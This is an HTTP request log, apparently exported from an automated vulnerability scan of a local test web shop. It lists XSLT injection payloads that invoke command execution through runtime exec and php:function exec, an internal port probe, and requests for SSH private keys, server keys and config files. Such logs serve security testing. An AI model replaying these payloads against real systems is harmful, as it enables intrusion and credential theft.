ID,Req. Timestamp,Resp. Timestamp,Method,URL,Code,Reason,RTT,Size Resp. Header,Size Resp. Body
6541,Thu Oct 09 23:25:47 IST 2025,Thu Oct 09 23:25:47 IST 2025,POST,http://192.168.8.101:3000/socket.io/?EIO=%3C&transport=polling&t=Pd9LmoF&sid=j94n85-oECNedDJJAAAl,400,Bad Request,28,230,41
6542,Thu Oct 09 23:25:47 IST 2025,Thu Oct 09 23:25:47 IST 2025,GET,http://192.168.8.101:3000,200,OK,18,469,75002
6543,Thu Oct 09 23:25:47 IST 2025,Thu Oct 09 23:25:47 IST 2025,POST,http://192.168.8.101:3000/socket.io/?EIO=%3C&transport=polling&t=Pd9XKjD&sid=CWfaRYAgm9i8v88hAAAx,400,Bad Request,6,230,41
6544,Thu Oct 09 23:25:47 IST 2025,Thu Oct 09 23:25:47 IST 2025,POST,http://192.168.8.101:3000/socket.io/?EIO=%3Cxsl%3Avalue-of+select%3D%22system-property%28%27xsl%3Avendor%27%29%22%2F%3E&transport=polling&t=Pd9LmoF&sid=j94n85-oECNedDJJAAAl,400,Bad Request,18,230,41
6545,Thu Oct 09 23:25:47 IST 2025,Thu Oct 09 23:25:47 IST 2025,POST,http://192.168.8.101:3000/socket.io/?EIO=system-property%28%27xsl%3Avendor%27%29%2F%3E&transport=polling&t=Pd9LmoF&sid=j94n85-oECNedDJJAAAl,400,Bad Request,13,230,41
6546,Thu Oct 09 23:25:47 IST 2025,Thu Oct 09 23:25:47 IST 2025,POST,http://192.168.8.101:3000/socket.io/?EIO=%3Cxsl%3Avalue-of+select%3D%22system-property%28%27xsl%3Avendor%27%29%22%2F%3E&transport=polling&t=Pd9XKjD&sid=CWfaRYAgm9i8v88hAAAx,400,Bad Request,14,230,41
6547,Thu Oct 09 23:25:47 IST 2025,Thu Oct 09 23:25:47 IST 2025,GET,http://192.168.8.101:3000/socket.io/winscp.ini,400,Bad Request,51,230,40
6548,Thu Oct 09 23:25:47 IST 2025,Thu Oct 09 23:25:47 IST 2025,POST,http://192.168.8.101:3000/socket.io/?EIO=%22%2F%3E%3Cxsl%3Avalue-of+select%3D%22system-property%28%27xsl%3Avendor%27%29%22%2F%3E%3C%21--&transport=polling&t=Pd9LmoF&sid=j94n85-oECNedDJJAAAl,400,Bad Request,24,230,41
6549,Thu Oct 09 23:25:47 IST 2025,Thu Oct 09 23:25:47 IST 2025,POST,http://192.168.8.101:3000/socket.io/?EIO=system-property%28%27xsl%3Avendor%27%29%2F%3E&transport=polling&t=Pd9XKjD&sid=CWfaRYAgm9i8v88hAAAx,400,Bad Request,12,230,41
6550,Thu Oct 09 23:25:47 IST 2025,Thu Oct 09 23:25:47 IST 2025,POST,http://192.168.8.101:3000/socket.io/?EIO=%3Cxsl%3Avalue-of+select%3D%22system-property%28%27xsl%3Avendor%27%29%22%2F%3E&transport=polling&t=Pd9LhnU&sid=j94n85-oECNedDJJAAAl,400,Bad Request,104,230,41
6551,Thu Oct 09 23:25:47 IST 2025,Thu Oct 09 23:25:47 IST 2025,POST,http://192.168.8.101:3000/socket.io/?EIO=%3Cxsl%3Avalue-of+select%3D%22system-property%28%27xsl%3Avendor%27%29%22%2F%3E%3C%21--&transport=polling&t=Pd9LmoF&sid=j94n85-oECNedDJJAAAl,400,Bad Request,15,230,41
6552,Thu Oct 09 23:25:47 IST 2025,Thu Oct 09 23:25:47 IST 2025,GET,http://192.168.8.101:3000/socket.io/WinSCP.ini,400,Bad Request,18,230,40
6553,Thu Oct 09 23:25:47 IST 2025,Thu Oct 09 23:25:47 IST 2025,POST,http://192.168.8.101:3000/socket.io/?EIO=%22%2F%3E%3Cxsl%3Avalue-of+select%3D%22system-property%28%27xsl%3Avendor%27%29%22%2F%3E%3C%21--&transport=polling&t=Pd9XKjD&sid=CWfaRYAgm9i8v88hAAAx,400,Bad Request,13,230,41
6554,Thu Oct 09 23:25:47 IST 2025,Thu Oct 09 23:25:47 IST 2025,POST,http://192.168.8.101:3000/socket.io/?EIO=system-property%28%27xsl%3Avendor%27%29%2F%3E&transport=polling&t=Pd9LhnU&sid=j94n85-oECNedDJJAAAl,400,Bad Request,17,230,41
6555,Thu Oct 09 23:25:47 IST 2025,Thu Oct 09 23:25:47 IST 2025,GET,http://192.168.8.101:3000/socket.io/.DS_Store,400,Bad Request,10,230,40
6556,Thu Oct 09 23:25:47 IST 2025,Thu Oct 09 23:25:47 IST 2025,POST,http://192.168.8.101:3000/socket.io/?EIO=%3Cxsl%3Avalue-of+select%3D%22document%28%27http%3A%2F%2F192.168.8.101%3A22%27%29%22%2F%3E&transport=polling&t=Pd9LmoF&sid=j94n85-oECNedDJJAAAl,400,Bad Request,22,230,41
6557,Thu Oct 09 23:25:47 IST 2025,Thu Oct 09 23:25:47 IST 2025,POST,http://192.168.8.101:3000/socket.io/?EIO=%3Cxsl%3Avalue-of+select%3D%22system-property%28%27xsl%3Avendor%27%29%22%2F%3E%3C%21--&transport=polling&t=Pd9XKjD&sid=CWfaRYAgm9i8v88hAAAx,400,Bad Request,7,230,41
6558,Thu Oct 09 23:25:47 IST 2025,Thu Oct 09 23:25:47 IST 2025,POST,http://192.168.8.101:3000/socket.io/?EIO=%22%2F%3E%3Cxsl%3Avalue-of+select%3D%22system-property%28%27xsl%3Avendor%27%29%22%2F%3E%3C%21--&transport=polling&t=Pd9LhnU&sid=j94n85-oECNedDJJAAAl,400,Bad Request,26,230,41
6559,Thu Oct 09 23:25:47 IST 2025,Thu Oct 09 23:25:47 IST 2025,POST,http://192.168.8.101:3000/socket.io/?EIO=%3Cxsl%3Avariable+name%3D%22rtobject%22+select%3D%22runtime%3AgetRuntime%28%29%22%2F%3E%0A%3Cxsl%3Avariable+name%3D%22process%22+select%3D%22runtime%3Aexec%28%24rtobject%2C%27erroneous_command%27%29%22%2F%3E%0A%3Cxsl%3Avariable+name%3D%22waiting%22+select%3D%22process%3AwaitFor%28%24process%29%22%2F%3E%0A%3Cxsl%3Avalue-of+select%3D%22%24process%22%2F%3E&transport=polling&t=Pd9LmoF&sid=j94n85-oECNedDJJAAAl,400,Bad Request,18,230,41
6560,Thu Oct 09 23:25:47 IST 2025,Thu Oct 09 23:25:47 IST 2025,POST,http://192.168.8.101:3000/socket.io/?EIO=%3Cxsl%3Avalue-of+select%3D%22document%28%27http%3A%2F%2F192.168.8.101%3A22%27%29%22%2F%3E&transport=polling&t=Pd9XKjD&sid=CWfaRYAgm9i8v88hAAAx,400,Bad Request,21,230,41
6563,Thu Oct 09 23:25:47 IST 2025,Thu Oct 09 23:25:47 IST 2025,POST,http://192.168.8.101:3000/socket.io/?EIO=%3Cxsl%3Avalue-of+select%3D%22php%3Afunction%28%27exec%27%2C%27erroneous_command+2%3E%26amp%3B1%27%29%22%2F%3E&transport=polling&t=Pd9LmoF&sid=j94n85-oECNedDJJAAAl,400,Bad Request,22,230,41
6562,Thu Oct 09 23:25:47 IST 2025,Thu Oct 09 23:25:47 IST 2025,GET,http://192.168.8.101:3000/socket.io/.php_cs.cache,400,Bad Request,58,230,40
6564,Thu Oct 09 23:25:47 IST 2025,Thu Oct 09 23:25:47 IST 2025,POST,http://192.168.8.101:3000/socket.io/?EIO=%3Cxsl%3Avariable+name%3D%22rtobject%22+select%3D%22runtime%3AgetRuntime%28%29%22%2F%3E%0A%3Cxsl%3Avariable+name%3D%22process%22+select%3D%22runtime%3Aexec%28%24rtobject%2C%27erroneous_command%27%29%22%2F%3E%0A%3Cxsl%3Avariable+name%3D%22waiting%22+select%3D%22process%3AwaitFor%28%24process%29%22%2F%3E%0A%3Cxsl%3Avalue-of+select%3D%22%24process%22%2F%3E&transport=polling&t=Pd9XKjD&sid=CWfaRYAgm9i8v88hAAAx,400,Bad Request,7,230,41
6566,Thu Oct 09 23:25:47 IST 2025,Thu Oct 09 23:25:47 IST 2025,POST,http://192.168.8.101:3000/socket.io/?EIO=4&transport=%3C&t=Pd9LmoF&sid=j94n85-oECNedDJJAAAl,400,Bad Request,9,230,40
6561,Thu Oct 09 23:25:47 IST 2025,Thu Oct 09 23:25:47 IST 2025,POST,http://192.168.8.101:3000/socket.io/?EIO=%3Cxsl%3Avalue-of+select%3D%22system-property%28%27xsl%3Avendor%27%29%22%2F%3E%3C%21--&transport=polling&t=Pd9LhnU&sid=j94n85-oECNedDJJAAAl,400,Bad Request,36,230,41
6567,Thu Oct 09 23:25:47 IST 2025,Thu Oct 09 23:25:47 IST 2025,POST,http://192.168.8.101:3000/socket.io/?EIO=4&transport=%3Cxsl%3Avalue-of+select%3D%22system-property%28%27xsl%3Avendor%27%29%22%2F%3E&t=Pd9LmoF&sid=j94n85-oECNedDJJAAAl,400,Bad Request,7,230,40
6565,Thu Oct 09 23:25:47 IST 2025,Thu Oct 09 23:25:47 IST 2025,GET,http://192.168.8.101:3000/socket.io/DEADJOE,400,Bad Request,7,230,40
6568,Thu Oct 09 23:25:48 IST 2025,Thu Oct 09 23:25:48 IST 2025,POST,http://192.168.8.101:3000/socket.io/?EIO=4&transport=system-property%28%27xsl%3Avendor%27%29%2F%3E&t=Pd9LmoF&sid=j94n85-oECNedDJJAAAl,400,Bad Request,17,230,40
6569,Thu Oct 09 23:25:47 IST 2025,Thu Oct 09 23:25:48 IST 2025,POST,http://192.168.8.101:3000/socket.io/?EIO=%3Cxsl%3Avalue-of+select%3D%22php%3Afunction%28%27exec%27%2C%27erroneous_command+2%3E%26amp%3B1%27%29%22%2F%3E&transport=polling&t=Pd9XKjD&sid=CWfaRYAgm9i8v88hAAAx,400,Bad Request,48,230,41
6570,Thu Oct 09 23:25:48 IST 2025,Thu Oct 09 23:25:48 IST 2025,GET,http://192.168.8.101:3000/socket.io/sites/default/private/files/backup_migrate/scheduled/test.txt,400,Bad Request,18,230,40
6571,Thu Oct 09 23:25:48 IST 2025,Thu Oct 09 23:25:48 IST 2025,GET,http://192.168.8.101:3000/socket.io/app/etc/local.xml,400,Bad Request,9,230,40
6572,Thu Oct 09 23:25:48 IST 2025,Thu Oct 09 23:25:48 IST 2025,POST,http://192.168.8.101:3000/socket.io/?EIO=4&transport=%22%2F%3E%3Cxsl%3Avalue-of+select%3D%22system-property%28%27xsl%3Avendor%27%29%22%2F%3E%3C%21--&t=Pd9LmoF&sid=j94n85-oECNedDJJAAAl,400,Bad Request,13,230,40
6573,Thu Oct 09 23:25:47 IST 2025,Thu Oct 09 23:25:48 IST 2025,POST,http://192.168.8.101:3000/socket.io/?EIO=%3Cxsl%3Avalue-of+select%3D%22document%28%27http%3A%2F%2F192.168.8.101%3A22%27%29%22%2F%3E&transport=polling&t=Pd9LhnU&sid=j94n85-oECNedDJJAAAl,400,Bad Request,64,230,41
6574,Thu Oct 09 23:25:48 IST 2025,Thu Oct 09 23:25:48 IST 2025,GET,http://192.168.8.101:3000/socket.io/server.key,400,Bad Request,11,230,40
6575,Thu Oct 09 23:25:48 IST 2025,Thu Oct 09 23:25:48 IST 2025,GET,http://192.168.8.101:3000/socket.io/privatekey.key,400,Bad Request,3,230,40
6576,Thu Oct 09 23:25:48 IST 2025,Thu Oct 09 23:25:48 IST 2025,POST,http://192.168.8.101:3000/socket.io/?EIO=4&transport=%3C&t=Pd9XKjD&sid=CWfaRYAgm9i8v88hAAAx,400,Bad Request,41,230,40
6577,Thu Oct 09 23:25:48 IST 2025,Thu Oct 09 23:25:48 IST 2025,GET,http://192.168.8.101:3000/socket.io/myserver.key,400,Bad Request,9,230,40
6578,Thu Oct 09 23:25:48 IST 2025,Thu Oct 09 23:25:48 IST 2025,POST,http://192.168.8.101:3000/socket.io/?EIO=4&transport=%3Cxsl%3Avalue-of+select%3D%22system-property%28%27xsl%3Avendor%27%29%22%2F%3E&t=Pd9XKjD&sid=CWfaRYAgm9i8v88hAAAx,400,Bad Request,7,230,40
6579,Thu Oct 09 23:25:48 IST 2025,Thu Oct 09 23:25:48 IST 2025,POST,http://192.168.8.101:3000/socket.io/?EIO=%3Cxsl%3Avariable+name%3D%22rtobject%22+select%3D%22runtime%3AgetRuntime%28%29%22%2F%3E%0A%3Cxsl%3Avariable+name%3D%22process%22+select%3D%22runtime%3Aexec%28%24rtobject%2C%27erroneous_command%27%29%22%2F%3E%0A%3Cxsl%3Avariable+name%3D%22waiting%22+select%3D%22process%3AwaitFor%28%24process%29%22%2F%3E%0A%3Cxsl%3Avalue-of+select%3D%22%24process%22%2F%3E&transport=polling&t=Pd9LhnU&sid=j94n85-oECNedDJJAAAl,400,Bad Request,13,230,41
6580,Thu Oct 09 23:25:48 IST 2025,Thu Oct 09 23:25:48 IST 2025,POST,http://192.168.8.101:3000/socket.io/?EIO=4&transport=system-property%28%27xsl%3Avendor%27%29%2F%3E&t=Pd9XKjD&sid=CWfaRYAgm9i8v88hAAAx,400,Bad Request,44,230,40
6581,Thu Oct 09 23:25:48 IST 2025,Thu Oct 09 23:25:48 IST 2025,GET,http://192.168.8.101:3000/socket.io/key.pem,400,Bad Request,63,230,40
6582,Thu Oct 09 23:25:48 IST 2025,Thu Oct 09 23:25:48 IST 2025,POST,http://192.168.8.101:3000/socket.io/?EIO=%3Cxsl%3Avalue-of+select%3D%22php%3Afunction%28%27exec%27%2C%27erroneous_command+2%3E%26amp%3B1%27%29%22%2F%3E&transport=polling&t=Pd9LhnU&sid=j94n85-oECNedDJJAAAl,400,Bad Request,109,230,41
6583,Thu Oct 09 23:25:48 IST 2025,Thu Oct 09 23:25:48 IST 2025,POST,http://192.168.8.101:3000/socket.io/?EIO=4&transport=%22%2F%3E%3Cxsl%3Avalue-of+select%3D%22system-property%28%27xsl%3Avendor%27%29%22%2F%3E%3C%21--&t=Pd9XKjD&sid=CWfaRYAgm9i8v88hAAAx,400,Bad Request,113,230,40
6584,Thu Oct 09 23:25:48 IST 2025,Thu Oct 09 23:25:48 IST 2025,POST,http://192.168.8.101:3000/socket.io/?EIO=4&transport=%3C&t=Pd9LhnU&sid=j94n85-oECNedDJJAAAl,400,Bad Request,11,230,40
6585,Thu Oct 09 23:25:48 IST 2025,Thu Oct 09 23:25:48 IST 2025,GET,http://192.168.8.101:3000/socket.io/id_rsa,400,Bad Request,118,230,40
6586,Thu Oct 09 23:25:48 IST 2025,Thu Oct 09 23:25:48 IST 2025,POST,http://192.168.8.101:3000/socket.io/?EIO=4&transport=%3Cxsl%3Avalue-of+select%3D%22system-property%28%27xsl%3Avendor%27%29%22%2F%3E&t=Pd9LhnU&sid=j94n85-oECNedDJJAAAl,400,Bad Request,6,230,40
6587,Thu Oct 09 23:25:48 IST 2025,Thu Oct 09 23:25:48 IST 2025,POST,http://192.168.8.101:3000/socket.io/?EIO=4&transport=system-property%28%27xsl%3Avendor%27%29%2F%3E&t=Pd9LhnU&sid=j94n85-oECNedDJJAAAl,400,Bad Request,6,230,40
6588,Thu Oct 09 23:25:48 IST 2025,Thu Oct 09 23:25:48 IST 2025,GET,http://192.168.8.101:3000/socket.io/id_dsa,400,Bad Request,17,230,40
6589,Thu Oct 09 23:25:48 IST 2025,Thu Oct 09 23:25:48 IST 2025,POST,http://192.168.8.101:3000/socket.io/?EIO=4&transport=%22%2F%3E%3Cxsl%3Avalue-of+select%3D%22system-property%28%27xsl%3Avendor%27%29%22%2F%3E%3C%21--&t=Pd9LhnU&sid=j94n85-oECNedDJJAAAl,400,Bad Request,20,230,40
6590,Thu Oct 09 23:25:48 IST 2025,Thu Oct 09 23:25:48 IST 2025,GET,http://192.168.8.101:3000/socket.io/.ssh/id_rsa,400,Bad Request,14,230,40
6591,Thu Oct 09 23:25:48 IST 2025,Thu Oct 09 23:25:48 IST 2025,GET,http://192.168.8.101:3000/socket.io/.ssh/id_dsa,400,Bad Request,7,230,40
6592,Thu Oct 09 23:25:48 IST 2025,Thu Oct 09 23:25:48 IST 2025,GET,http://192.168.8.101:3000/socket.io/adminer.php,400,Bad Request,5,230,40
6593,Thu Oct 09 23:25:48 IST 2025,Thu Oct 09 23:25:48 IST 2025,GET,http://192.168.8.101:3000/socket.io/vb_test.php,400,Bad Request,5,230,40
6594,Thu Oct 09 23:25:48 IST 2025,Thu Oct 09 23:25:48 IST 2025,GET,http://192.168.8.101:3000/socket.io/CHANGELOG.txt,400,Bad Request,20,230,40
6595,Thu Oct 09 23:25:48 IST 2025,Thu Oct 09 23:25:48 IST 2025,GET,http://192.168.8.101:3000/socket.io/sites/default/files/.ht.sqlite,400,Bad Request,14,230,40
6596,Thu Oct 09 23:25:48 IST 2025,Thu Oct 09 23:25:48 IST 2025,GET,http://192.168.8.101:3000/socket.io/composer.json,400,Bad Request,26,230,40
6597,Thu Oct 09 23:25:48 IST 2025,Thu Oct 09 23:25:48 IST 2025,GET,http://192.168.8.101:3000/socket.io/composer.lock,400,Bad Request,13,230,40
6598,Thu Oct 09 23:25:48 IST 2025,Thu Oct 09 23:25:48 IST 2025,GET,http://192.168.8.101:3000/api,500,Internal Server Error,23,363,1823
6599,Thu Oct 09 23:25:48 IST 2025,Thu Oct 09 23:25:48 IST 2025,GET,http://192.168.8.101:3000/socket.io/vim_settings.xml,400,Bad Request,40,230,40
6600,Thu Oct 09 23:25:48 IST 2025,Thu Oct 09 23:25:48 IST 2025,GET,http://192.168.8.101:3000/socket.io/server-info,400,Bad Request,16,230,40
6601,Thu Oct 09 23:25:48 IST 2025,Thu Oct 09 23:25:48 IST 2025,GET,http://192.168.8.101:3000/socket.io/phpinfo.php,400,Bad Request,42,230,40
6602,Thu Oct 09 23:25:48 IST 2025,Thu Oct 09 23:25:48 IST 2025,GET,http://192.168.8.101:3000/socket.io/info.php,400,Bad Request,39,230,40
6604,Thu Oct 09 23:25:48 IST 2025,Thu Oct 09 23:25:48 IST 2025,GET,http://192.168.8.101:3000/socket.io/i.php,400,Bad Request,43,230,40
6605,Thu Oct 09 23:25:48 IST 2025,Thu Oct 09 23:25:48 IST 2025,GET,http://192.168.8.101:3000/socket.io/test.php,400,Bad Request,3,230,40
6606,Thu Oct 09 23:25:48 IST 2025,Thu Oct 09 23:25:48 IST 2025,GET,http://192.168.8.101:3000/socket.io/_wpeprivate/config.json,400,Bad Request,4,230,40
6607,Thu Oct 09 23:25:48 IST 2025,Thu Oct 09 23:25:48 IST 2025,GET,http://192.168.8.101:3000/socket.io/_framework/blazor.boot.json,400,Bad Request,13,230,40
6603,Thu Oct 09 23:25:48 IST 2025,Thu Oct 09 23:25:48 IST 2025,GET,http://192.168.8.101:3000/api/Challenges,200,OK,198,389,59080
6608,Thu Oct 09 23:25:48 IST 2025,Thu Oct 09 23:25:48 IST 2025,GET,http://192.168.8.101:3000/socket.io/.hg,400,Bad Request,6,230,40
6609,Thu Oct 09 23:25:48 IST 2025,Thu Oct 09 23:25:48 IST 2025,GET,http://192.168.8.101:3000/socket.io/.bzr,400,Bad Request,19,230,40
6610,Thu Oct 09 23:25:48 IST 2025,Thu Oct 09 23:25:48 IST 2025,GET,http://192.168.8.101:3000/socket.io/._darcs,400,Bad Request,7,230,40
6611,Thu Oct 09 23:25:48 IST 2025,Thu Oct 09 23:25:48 IST 2025,GET,http://192.168.8.101:3000/socket.io/BitKeeper,400,Bad Request,70,230,40
6612,Thu Oct 09 23:25:48 IST 2025,Thu Oct 09 23:25:48 IST 2025,GET,http://192.168.8.101:3000/api/Quantitys,304,Not Modified,230,306,0
6613,Thu Oct 09 23:25:48 IST 2025,Thu Oct 09 23:25:48 IST 2025,GET,http://192.168.8.101:3000/api/Challenges/?name=%3C,200,OK,205,384,30
6614,Thu Oct 09 23:25:48 IST 2025,Thu Oct 09 23:25:49 IST 2025,GET,http://192.168.8.101:3000/assets,301,Moved Permanently,21,416,156
6615,Thu Oct 09 23:25:49 IST 2025,Thu Oct 09 23:25:49 IST 2025,GET,http://192.168.8.101:3000/assets/i18n,301,Moved Permanently,4,421,161
6616,Thu Oct 09 23:25:49 IST 2025,Thu Oct 09 23:25:49 IST 2025,GET,http://192.168.8.101:3000/assets/public,301,Moved Permanently,7,423,163
6617,Thu Oct 09 23:25:48 IST 2025,Thu Oct 09 23:25:49 IST 2025,GET,http://192.168.8.101:3000/api/Challenges/?name=%3Cxsl%3Avalue-of+select%3D%22system-property%28%27xsl%3Avendor%27%29%22%2F%3E,200,OK,164,384,30
6618,Thu Oct 09 23:25:49 IST 2025,Thu Oct 09 23:25:49 IST 2025,GET,http://192.168.8.101:3000/assets/public/images,301,Moved Permanently,19,430,170
6619,Thu Oct 09 23:25:49 IST 2025,Thu Oct 09 23:25:49 IST 2025,GET,http://192.168.8.101:3000/assets/public/images/products,301,Moved Permanently,6,439,179
6620,Thu Oct 09 23:25:49 IST 2025,Thu Oct 09 23:25:49 IST 2025,GET,http://192.168.8.101:3000/api/Challenges/?name=system-property%28%27xsl%3Avendor%27%29%2F%3E,200,OK,118,384,30
6621,Thu Oct 09 23:25:49 IST 2025,Thu Oct 09 23:25:49 IST 2025,GET,http://192.168.8.101:3000/rest,500,Internal Server Error,24,363,1825
6622,Thu Oct 09 23:25:49 IST 2025,Thu Oct 09 23:25:49 IST 2025,GET,http://192.168.8.101:3000/api/Challenges/?name=%22%2F%3E%3Cxsl%3Avalue-of+select%3D%22system-property%28%27xsl%3Avendor%27%29%22%2F%3E%3C%21--,200,OK,172,384,30
6623,Thu Oct 09 23:25:49 IST 2025,Thu Oct 09 23:25:49 IST 2025,GET,http://192.168.8.101:3000/rest/admin,500,Internal Server Error,45,363,1837
6624,Thu Oct 09 23:25:49 IST 2025,Thu Oct 09 23:25:49 IST 2025,GET,http://192.168.8.101:3000/rest/products,500,Internal Server Error,13,363,1843
6625,Thu Oct 09 23:25:49 IST 2025,Thu Oct 09 23:25:49 IST 2025,GET,http://192.168.8.101:3000/rest/products/1,500,Internal Server Error,21,363,1847
6626,Thu Oct 09 23:25:49 IST 2025,Thu Oct 09 23:25:49 IST 2025,GET,http://192.168.8.101:3000/rest/user,500,Internal Server Error,16,363,1835
6627,Thu Oct 09 23:25:49 IST 2025,Thu Oct 09 23:25:49 IST 2025,GET,http://192.168.8.101:3000/socket.io,200,OK,102,469,75002
6628,Thu Oct 09 23:25:49 IST 2025,Thu Oct 09 23:25:49 IST 2025,GET,http://192.168.8.101:3000/socket.io/?EIO=%3C&transport=polling&t=Pd9XKj-&sid=CWfaRYAgm9i8v88hAAAx,400,Bad Request,19,230,41
6629,Thu Oct 09 23:25:49 IST 2025,Thu Oct 09 23:25:49 IST 2025,GET,http://192.168.8.101:3000/socket.io/?EIO=%3Cxsl%3Avalue-of+select%3D%22system-property%28%27xsl%3Avendor%27%29%22%2F%3E&transport=polling&t=Pd9XKj-&sid=CWfaRYAgm9i8v88hAAAx,400,Bad Request,31,230,41
6630,Thu Oct 09 23:25:49 IST 2025,Thu Oct 09 23:25:49 IST 2025,GET,http://192.168.8.101:3000/socket.io/?EIO=system-property%28%27xsl%3Avendor%27%29%2F%3E&transport=polling&t=Pd9XKj-&sid=CWfaRYAgm9i8v88hAAAx,400,Bad Request,20,230,41
6631,Thu Oct 09 23:25:49 IST 2025,Thu Oct 09 23:25:49 IST 2025,GET,http://192.168.8.101:3000/socket.io/?EIO=%22%2F%3E%3Cxsl%3Avalue-of+select%3D%22system-property%28%27xsl%3Avendor%27%29%22%2F%3E%3C%21--&transport=polling&t=Pd9XKj-&sid=CWfaRYAgm9i8v88hAAAx,400,Bad Request,25,230,41
6632,Thu Oct 09 23:25:49 IST 2025,Thu Oct 09 23:25:49 IST 2025,GET,http://192.168.8.101:3000/socket.io/?EIO=%3Cxsl%3Avalue-of+select%3D%22system-property%28%27xsl%3Avendor%27%29%22%2F%3E%3C%21--&transport=polling&t=Pd9XKj-&sid=CWfaRYAgm9i8v88hAAAx,400,Bad Request,7,230,41
6633,Thu Oct 09 23:25:49 IST 2025,Thu Oct 09 23:25:49 IST 2025,GET,http://192.168.8.101:3000/socket.io/?EIO=%3Cxsl%3Avalue-of+select%3D%22document%28%27http%3A%2F%2F192.168.8.101%3A22%27%29%22%2F%3E&transport=polling&t=Pd9XKj-&sid=CWfaRYAgm9i8v88hAAAx,400,Bad Request,13,230,41
6634,Thu Oct 09 23:25:49 IST 2025,Thu Oct 09 23:25:50 IST 2025,GET,http://192.168.8.101:3000/socket.io/?EIO=%3Cxsl%3Avariable+name%3D%22rtobject%22+select%3D%22runtime%3AgetRuntime%28%29%22%2F%3E%0A%3Cxsl%3Avariable+name%3D%22process%22+select%3D%22runtime%3Aexec%28%24rtobject%2C%27erroneous_command%27%29%22%2F%3E%0A%3Cxsl%3Avariable+name%3D%22waiting%22+select%3D%22process%3AwaitFor%28%24process%29%22%2F%3E%0A%3Cxsl%3Avalue-of+select%3D%22%24process%22%2F%3E&transport=polling&t=Pd9XKj-&sid=CWfaRYAgm9i8v88hAAAx,400,Bad Request,44,230,41
6635,Thu Oct 09 23:25:50 IST 2025,Thu Oct 09 23:25:50 IST 2025,GET,http://192.168.8.101:3000/socket.io/?EIO=%3Cxsl%3Avalue-of+select%3D%22php%3Afunction%28%27exec%27%2C%27erroneous_command+2%3E%26amp%3B1%27%29%22%2F%3E&transport=polling&t=Pd9XKj-&sid=CWfaRYAgm9i8v88hAAAx,400,Bad Request,14,230,41
6636,Thu Oct 09 23:25:49 IST 2025,Thu Oct 09 23:25:50 IST 2025,GET,http://192.168.8.101:3000/rest/products/search?q=%3C,200,OK,450,388,7293
6637,Thu Oct 09 23:25:50 IST 2025,Thu Oct 09 23:25:50 IST 2025,GET,http://192.168.8.101:3000/socket.io/?EIO=%3C&transport=websocket&sid=CWfaRYAgm9i8v88hAAAx,400,Bad Request,34,92,18
6638,Thu Oct 09 23:25:50 IST 2025,Thu Oct 09 23:25:50 IST 2025,GET,http://192.168.8.101:3000/socket.io/?EIO=4&transport=%3C&t=Pd9XKj-&sid=CWfaRYAgm9i8v88hAAAx,400,Bad Request,47,230,40
6639,Thu Oct 09 23:25:50 IST 2025,Thu Oct 09 23:25:50 IST 2025,GET,http://192.168.8.101:3000/socket.io/?EIO=%3Cxsl%3Avalue-of+select%3D%22system-property%28%27xsl%3Avendor%27%29%22%2F%3E&transport=websocket&sid=CWfaRYAgm9i8v88hAAAx,400,Bad Request,47,92,18
6640,Thu Oct 09 23:25:50 IST 2025,Thu Oct 09 23:25:50 IST 2025,GET,http://192.168.8.101:3000/socket.io/?EIO=4&transport=%3Cxsl%3Avalue-of+select%3D%22system-property%28%27xsl%3Avendor%27%29%22%2F%3E&t=Pd9XKj-&sid=CWfaRYAgm9i8v88hAAAx,400,Bad Request,63,230,40
6641,Thu Oct 09 23:25:50 IST 2025,Thu Oct 09 23:25:50 IST 2025,GET,http://192.168.8.101:3000/socket.io/?EIO=system-property%28%27xsl%3Avendor%27%29%2F%3E&transport=websocket&sid=CWfaRYAgm9i8v88hAAAx,400,Bad Request,48,92,18
6642,Thu Oct 09 23:25:50 IST 2025,Thu Oct 09 23:25:50 IST 2025,GET,http://192.168.8.101:3000/socket.io/?EIO=%22%2F%3E%3Cxsl%3Avalue-of+select%3D%22system-property%28%27xsl%3Avendor%27%29%22%2F%3E%3C%21--&transport=websocket&sid=CWfaRYAgm9i8v88hAAAx,400,Bad Request,24,92,18
6643,Thu Oct 09 23:25:50 IST 2025,Thu Oct 09 23:25:50 IST 2025,GET,http://192.168.8.101:3000/socket.io/?EIO=4&transport=system-property%28%27xsl%3Avendor%27%29%2F%3E&t=Pd9XKj-&sid=CWfaRYAgm9i8v88hAAAx,400,Bad Request,28,230,40
6645,Thu Oct 09 23:25:49 IST 2025,Thu Oct 09 23:25:50 IST 2025,GET,http://192.168.8.101:3000/api/Challenges/?name=%3Cxsl%3Avalue-of+select%3D%22system-property%28%27xsl%3Avendor%27%29%22%2F%3E%3C%21--,200,OK,979,384,30
